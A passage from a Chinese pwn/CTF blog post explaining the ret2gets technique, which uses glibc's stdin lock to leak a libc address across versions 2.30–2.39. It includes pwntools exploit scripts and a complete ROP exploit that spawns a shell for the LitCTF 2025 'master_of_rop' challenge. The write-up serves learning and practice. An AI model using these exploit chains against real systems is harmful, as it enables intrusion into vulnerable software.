can!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">4</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">tls = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;tls: <span class="subst">&#123;<span class="built_in">hex</span>(tls)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = tls + <span class="number">0x28c0</span></span><br><span class="line">log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>上述exp在 2.35 上进行了测试，应该适用于 2.30-2.36，但 2.37 将 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L37">_IO_lock_lock</a> 和 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.37/source/sysdeps/nptl/stdio-lock.h#L70">_IO_lock_unlock</a> 更改为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_lock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;									      \</span></span><br><span class="line"><span class="meta">    void *__self = THREAD_SELF;						      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (SINGLE_THREAD_P &amp;&amp; (_name).owner == NULL)			      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">	(_name).lock = LLL_LOCK_INITIALIZER_LOCKED;			      \</span></span><br><span class="line"><span class="meta">	(_name).owner = __self;						      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> <span class="keyword">if</span> ((_name).owner != __self)					      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">	lll_lock ((_name).lock, LLL_PRIVATE);				      \</span></span><br><span class="line"><span class="meta">	(_name).owner = __self;						      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>								      \</span></span><br><span class="line"><span class="meta">      ++(_name).cnt;							      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_lock_unlock(_name) \</span></span><br><span class="line"><span class="meta">  do &#123;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (SINGLE_THREAD_P &amp;&amp; (_name).cnt == 0)				      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">	(_name).owner = NULL;						      \</span></span><br><span class="line"><span class="meta">	(_name).lock = 0;						      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> <span class="keyword">if</span> ((_name).cnt == 0)						      \</span></span><br><span class="line"><span class="meta">      &#123;									      \</span></span><br><span class="line"><span class="meta">	(_name).owner = NULL;						      \</span></span><br><span class="line"><span class="meta">	lll_unlock ((_name).lock, LLL_PRIVATE);				      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>								      \</span></span><br><span class="line"><span class="meta">      --(_name).cnt;							      \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>仅当 <code>cnt ！= 0</code> 时，<code>cnt</code> 才会递减<br>这就导致我们没有办法再利用 <code>整数溢出</code> 来绕过 <code>\x00</code> 带来的截断</p>
<p>但是没有关系，我们依旧有办法解决</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># glibc-2.37 to glibc-2.39 更高版本未进行尝试</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = context.binary = ELF(<span class="string">&#x27;demo&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc&quot;</span>)</span><br><span class="line">p = e.process()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(<span class="number">0</span>)	<span class="comment"># saved rbp</span></span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line">payload += p64(e.plt.gets)</span><br><span class="line">payload += p64(e.plt.puts)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ROP me if you can!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">4</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;CCCC&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">tls = u64(p.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">log.info(<span class="string">f&quot;tls: <span class="subst">&#123;<span class="built_in">hex</span>(tls)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = tls + <span class="number">0x28c0</span></span><br><span class="line">log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>我们来对着上面这个exp调试一下<br>溢出之后的第一次gets，我们输入了 <code>\x00\x00\x00\x00AAAABBBBBBBB</code> 而第一个 <code>A-1 </code> 变成了 <code>0x40</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/10.png"></p>
<p>溢出之后的第二次gets，我们输入了 <code>CCCC</code> 并且将原本的 <code>0x40</code> 覆盖成了字符串终止符 <code>\x00</code> (注意这还没有结束)<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/11.png"></p>
<p>最后执行我们执行 <code>cnt-1</code><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/12.png"></p>
<p>我们发现原本的 <code>0x41414100</code> 变成了 <code>0x414140ff</code> 我们依旧是完美的绕过了 <code>\x00</code> 以及各种检测</p>
<h3 id="额外的情况发生了怎么办呢"><a href="#额外的情况发生了怎么办呢" class="headerlink" title="额外的情况发生了怎么办呢?"></a><strong>额外的情况发生了怎么办呢?</strong></h3><p>下面我们探讨一个新问题:<br>虽然我们拥有gets<br>但是最后程序结束的时候 <code>rdi != _IO_stdfile_0_lock</code> 怎么办<br>比如下面这个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;ROP me if you can!&quot;</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line">	func(); <span class="comment">// 未知函数，执行之后不知道 rdi 会是什么</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么会有以下几种情况:</p>
<ol>
<li><p><code>rdi</code> 虽然不是 <code>_IO_stdfile_0_lock</code> 但是依旧可写<br>这种情况很简单，溢出之后调用一次gets，<code>rdi</code> 就变成 <code>_IO_stdfile_0_lock</code> 然后思路后续还是一样的思路，2.30-2.36调用gets然后调用puts泄露，2.37+则调用两次gets再调用puts</p>
</li>
<li><p><code>rdi</code> 不可写了，但是可读<br>没办法调用gets了，但是我们可以考虑直接使用puts是否会有效果</p>
</li>
<li><p><code>rdi == NULL</code><br>大多数IO函数已经没办法使用了，但是 <code>printf</code> 依旧可用<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/printf.c#L27">printf</a> 定义如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list arg;</span><br><span class="line">  <span class="type">int</span> done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = __vfprintf_internal (<span class="built_in">stdout</span>, format, arg, <span class="number">0</span>);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在源码中我们可以看到它调用了 <code>__vfprintf_internal</code> 这个函数，并且第一个参数为 <code>stdout</code> , 这意味着 <code>rdi</code> 寄存器将指向 <code>stdout</code></p>
</li>
</ol>
<p>然后在 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L1179">__vfprintf_internal</a> 中，我们看到它在早期调用 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/stdio-common/vfprintf-internal.c#L49">ARGCHECK</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check of arguments.  */</span></span><br><span class="line">  ARGCHECK (s, format);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARGCHECK(S, Format) \</span></span><br><span class="line"><span class="meta">  do									      \</span></span><br><span class="line"><span class="meta">    &#123;									      \</span></span><br><span class="line"><span class="meta">      <span class="comment">/* Check file argument for consistence.  */</span>			      \</span></span><br><span class="line"><span class="meta">      CHECK_FILE (S, -1);						      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (S-&gt;_flags &amp; _IO_NO_WRITES)					      \</span></span><br><span class="line"><span class="meta">	&#123;								      \</span></span><br><span class="line"><span class="meta">	  S-&gt;_flags |= _IO_ERR_SEEN;					      \</span></span><br><span class="line"><span class="meta">	  __set_errno (EBADF);						      \</span></span><br><span class="line"><span class="meta">	  return -1;							      \</span></span><br><span class="line"><span class="meta">	&#125;								      \</span></span><br><span class="line"><span class="meta">      <span class="keyword">if</span> (Format == NULL)						      \</span></span><br><span class="line"><span class="meta">	&#123;								      \</span></span><br><span class="line"><span class="meta">	  __set_errno (EINVAL);						      \</span></span><br><span class="line"><span class="meta">	  return -1;							      \</span></span><br><span class="line"><span class="meta">	&#125;								      \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br></pre></td></tr></table></figure>

<p>通过上面代码我们不难得到结论，如果 <code>format == NULL</code> 那么 <code>printf函数</code> 会被强制返回，也就是说并不会导致错误，而且由于<code>__vfprintf_internal</code> 的第一个参数为 <code>stdout</code> 也就是说强制返回的时候 <code>rdi</code> 将指向 <code>stdout</code> 下面我们来写一段代码验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -Wno-nonnull -Wno-format-overflow -o printf_test printf_test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然，我们的结论是成立的<br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/13.png"><br><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/14.png"></p>
<p>那么也就是说这里我们可以再次调用gets，然后就可以控制 <code>_IO_2_1_stdout_</code> 熟悉IO的师傅应该可以知道，控制了这个之后如果条件允许我们是可以打 <code>FSOP</code> 的，当然这里不详细展开</p>
<p>当然还有别的情况，这里不在过多介绍，感兴趣的师傅可以看看我参考的文章讲解的更加详细</p>
<p>下面推荐一个题目是 <code>2025 LitCTF</code> 的 <code>master of rop</code><br><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6782">[LitCTF 2025]master_of_rop | NSSCTF</a></p>
<p>懒得分析了，直接贴exp<br>但是很怪，本地打不通，远程却可以通</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> xidp <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#---------------------初始化----------------------------</span></span><br><span class="line">arch = <span class="number">64</span> </span><br><span class="line">elf_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">challenge = <span class="string">&quot;./pwn2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">ip = <span class="string">&#x27;node4.anna.nssctf.cn:28093&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1-远程 其他-本地</span></span><br><span class="line">link = <span class="number">1</span></span><br><span class="line">io, elf, libc = loadfile(challenge, libc_path, ip, arch, elf_os, link)</span><br><span class="line"></span><br><span class="line">debug(<span class="number">0</span>)            <span class="comment"># 其他-debug   1-info</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#---------------------初始化-----------------------------</span></span><br><span class="line"><span class="comment">#---------------------debug------------------------------</span></span><br><span class="line"><span class="comment"># 自定义cmd</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    set follow-fork-mode parent\n</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 断点</span></span><br><span class="line">bps = []</span><br><span class="line"><span class="comment">#---------------------debug-------------------------------</span></span><br><span class="line"></span><br><span class="line">gets_plt = elf.plt[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;gets_plt&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;puts_plt&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x04011AD</span> </span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(gets_plt)</span><br><span class="line">payload += p64(gets_plt)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Welcome to LitCTF2025!\n&quot;</span>, payload)</span><br><span class="line">io.sendline(p32(<span class="number">0</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">4</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">8</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;CCCC&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">tls = u64(io.recv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">leak(<span class="string">&quot;tls&quot;</span>)</span><br><span class="line">libc_base = tls + <span class="number">0x28c0</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]    </span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000010f75b</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">ret = libc_base + <span class="number">0x000000000002882f</span><span class="comment">#: ret;</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">0x28</span> </span><br><span class="line">payload += p64(pop_rdi_ret) </span><br><span class="line">payload += p64(bin_sh_addr) </span><br><span class="line">payload += p64(ret) </span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg(1, bps, cmd)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Welcome to LitCTF2025!\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/15.png"></p>
<p>参考:<br><a target="_blank" rel="noopener" href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#sidenote-on-finding-locking-functions">ret2gets | pwn-notes</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">XiDP</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/13/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">http://example.com/2025/06/13/ret2gets%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">XiDP</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/ret2X/">ret2X</a></div><div class="post-share"><div class="social-share" data-image="/img/Qhead.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/06/13/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" title="非栈上格式化字符串的利用方法"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">非栈上格式化字符串的利用方法</div></div><div class="info-2"><div class="info-item-1">前言本文以第六届强网拟态线下赛的格式化字符串Pwn题为例，分享非栈上格式化字符串的利用方法。主要涵盖两个关键技术点：   多级指针链利用：当格式化字符串不在栈上时，通过修改栈上现有的多级指针链（二重&#x2F;三重指针）来间接控制目标内存  高位截断技术：当前期输出字符数已超过后期需求值时，利用0x10000溢出特性实现单字节精确写入  同时探讨为何不能在同一条指针链上使用 $ 符号进行连续修改的问题，并提出个人结论（如有错误希望师傅们指出）。 通过网盘分享的文件：第六届强网拟态fmt.rar链接: https://pan.baidu.com/s/19-fAYm0DuEhkSO7SzlJLAg?pwd=xidp 提取码: xidp 第六届强网拟态线下赛的格式化字符串 程序逻辑很简单，白给一个stack的地址，然后给一个非栈上格式化字符串的机会，最后没办法控制main函数的返回地址，因为是直接使用exit退出 显而易见的我们遇到了两个问题:  首先我们的 buf 不在栈上，没办法随意在栈中写入我们想要的地址然后去修改 其次我们只有一次机会  首先来看看如果是 非栈上的格式化字符串...</div></div></div></a><a class="pagination-related" href="/2025/06/14/DIR-815%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E(CNVD-2013-11625)%E5%A4%8D%E7%8E%B0/" title="DIR-815 栈溢出漏洞(CNVD-2013-11625)复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">DIR-815 栈溢出漏洞(CNVD-2013-11625)复现</div></div><div class="info-2"><div class="info-item-1">复现环境及所需工具漏洞复现环境Ubuntu 24.04.2 LTS 基础工具配置基础的Pwn环境 + binwalk + sasquatch + qemupwn环境配置推荐YX-hueimie师傅的博客★pwn 24.04环境搭建保姆级教程★_ubuntu24 pwn-CSDN博客★pwn 22.04环境搭建保姆级教程★_pwn环境搭建-CSDN博客 安装binwalk可以直接使用apt安装，也可以下载binwalk的源码来自己编译 1sudo apt install binwalk  sasquatch 是binwalk用于解压非标准SquashFS文件系统的关键依赖(入门不安装这个那么我们之后binwalk分解固件会发现里面 squashfs-root 文件夹是空的)安装方法如下: 123456# 安装依赖库（关键步骤，否则编译会失败） sudo apt-get install build-essential zlib1g-dev liblzma-dev liblzo2-dev # 克隆仓库并编译 git clone...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/06/13/2025%20ISCC%20%E6%93%82%E5%8F%B0%E8%B5%9BPwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 ISCC 擂台赛Pwn-wp(含附件)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-13</div><div class="info-item-2">2025 ISCC 擂台赛Pwn-wp(含附件)</div></div><div class="info-2"><div class="info-item-1">前言相比练武赛，擂台赛的题目指令还是要高很多的，里面都是师傅们用心出的题目，感觉创新度还是有的，但是为什么那么多vm pwn？？？ 通过网盘分享的文件：2025ISCC擂台赛Pwn全部附件.rar链接: https://pan.baidu.com/s/1y_zdFltMZmCxfxalS9EuCw?pwd=xidp 提取码: xidp 解出能力有限，很多方法可能并不是最优解，如果有师傅有更方便的方法愿意分享的话我会非非非常感谢的 call checksec查看程序保护，发现程序没有开启pie保护以及canary保护程序存在明显的栈溢出 直接溢出打ROP泄露libc地址然后执行system(&quot;/bin/sh&quot;)即可完整exp如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from xidp import *#---------------------初始化----------------------------arch =...</div></div></div></a><a class="pagination-related" href="/2025/06/13/2025%20UCSCCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 UCSCCTF Pwn-wp(含附件)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-13</div><div class="info-item-2">2025 UCSCCTF Pwn-wp(含附件)</div></div><div class="info-2"><div class="info-item-1">前言说实话有点失望, 比赛平台超级卡，而且比赛一开始平台就崩了，题目难度偏低(也是很遗憾，本来可以抢个血分的，但是太卡了靶机就是打不开)但是还是感谢比赛出题的师傅愿意分享自己的题目 通过网盘分享的文件：2025UCSCCTF.rar链接: https://pan.baidu.com/s/17yqcmGRXWN1oNMvgZNRv5w?pwd=xidp 提取码: xidp内含2025 UCSCCTF三个pwn题的附件 由于题目比较简单我就简单介绍我的思路并放上exp了 BoFido-Ucsc程序里开头有seed =...</div></div></div></a><a class="pagination-related" href="/2024/06/12/PWN%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/" title="PWN入门手册"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-12</div><div class="info-item-2">PWN入门手册</div></div><div class="info-2"><div class="info-item-1">什么是 PWN？PWN 是黑客术语中的俚语，是指攻破设备或者系统。它的发音类似于“砰”，当然也有师傅把它叫作“胖”。PWN 的目标是获取系统的控制权或执行未经授权的操作。 如何入门 PWN前置知识 C 语言  学习内容： 程序结构和基础语法 数据类型、分支语句（如 if、switch）和循环（如 for、while） 指针和结构体   学习资源： 浙江大学翁恺教你 C 语言程序设计 C 语言教程 | 菜鸟教程     Python 语言  学习内容： 程序结构和基础语法 循环（for、while）和异常处理（如 try）   学习资源： Python3 教程 | 菜鸟教程 超基础 Python 课程     建议：掌握 C 语言后，可以直接用文章进行 Python 的学习，进度会更快。    汇编语言  常见类型： x86 汇编：Intel 和 AMD 的处理器架构 ARM 汇编：用于移动设备 MIPS 汇编：用于嵌入式系统 PowerPC 汇编：曾用于苹果计算机 RISC-V...</div></div></div></a><a class="pagination-related" href="/2025/06/13/2025%20XYCTF%20Pwn-wp(%E5%90%AB%E9%99%84%E4%BB%B6)/" title="2025 XYCTF Pwn-wp(含附件)"><div class="cover" style="background: 